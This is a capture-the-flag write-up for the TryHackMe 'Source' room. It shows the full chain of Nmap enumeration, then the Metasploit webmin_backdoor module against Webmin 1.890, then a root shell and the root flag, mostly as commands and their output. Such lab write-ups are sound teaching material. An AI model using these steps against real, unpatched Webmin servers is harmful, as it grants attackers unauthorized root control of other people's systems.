---

Name: Source
Difficulty: Easy
URL: https://tryhackme.com/room/Source
Description: Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

---

## Enumeration

The initial Nmap scan revealed two open ports:

```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```

Port `10000` was running Webmin, specifically version `1.890`.

Opening the service in a browser confirmed that Webmin was accessible:

```text
https://10.112.166.220:10000/
```

Since the version was known, I searched for vulnerabilities affecting Webmin 1.890.

## Exploiting Webmin

Webmin `1.890` is vulnerable to the **Webmin password_change.cgi backdoor**, which allows unauthenticated remote command execution.

Metasploit already contains an exploit for this vulnerability, so I searched for Webmin modules:

```text
msf > search webmin

Matching Modules
================

   #   Full Name
   -   ---------
   0   exploit/unix/webapp/webmin_show_cgi_exec
   1   auxiliary/admin/webmin/file_disclosure
   2   exploit/linux/http/webmin_file_manager_rce
   3   exploit/linux/http/webmin_package_updates_rce
   7   exploit/linux/http/webmin_packageup_rce
   8   exploit/unix/webapp/webmin_upload_exec
   9   auxiliary/admin/webmin/edit_html_fileaccess
   10  exploit/linux/http/webmin_backdoor
```

The `webmin_backdoor` module was the relevant exploit:

```text
msf > use 10
```

I then configured the target and my VPN interface:

```text
msf exploit(linux/http/webmin_backdoor) > set RHOSTS 10.112.166.220
rhosts => 10.112.166.220

msf exploit(linux/http/webmin_backdoor) > set LHOST tun0
lhost => 192.168.131.170

msf exploit(linux/http/webmin_backdoor) > set SSL true
SSL => true
```

Finally, I launched the exploit:

```text
msf exploit(linux/http/webmin_backdoor) > run
```

This successfully gave me a shell on the target.

## Getting Root

I immediately checked my privileges:

```text
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

The exploit had given me a **root shell**, so no additional privilege escalation was necessary.

For completeness, `sudo -l` also confirmed that the current user was root:

```text
root@source:/home/dark# sudo -l

Matching Defaults entries for root on source:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User root may run the following commands on source:
    (ALL : ALL) ALL
```

Since I already had root privileges, I could simply read the root flag:

```bash
cat /root/root.txt
```
